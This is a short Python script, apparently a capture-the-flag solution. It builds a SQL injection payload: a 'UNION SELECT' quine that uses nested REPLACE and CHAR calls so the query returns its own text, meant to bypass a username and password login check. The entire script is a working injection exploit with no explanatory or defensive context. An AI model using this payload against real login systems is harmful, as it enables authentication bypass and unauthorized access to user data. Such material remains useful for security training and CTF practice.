def quine(data):
	data = data.replace('$$', 'REPLACE(REPLACE($$,CHAR(34),CHAR(39)),CHAR(36),$$)')
	blob = data.replace('$$', '"$"').replace("'", '"')
	return data.replace('$$', "'" + blob + "'")

password = 'a'
username = quine("' UNION SELECT $$ AS username, CHAR(" + str(ord(password)) + ") AS k--{flag.flag}")
print (f"username = {username}\npassword = {password}")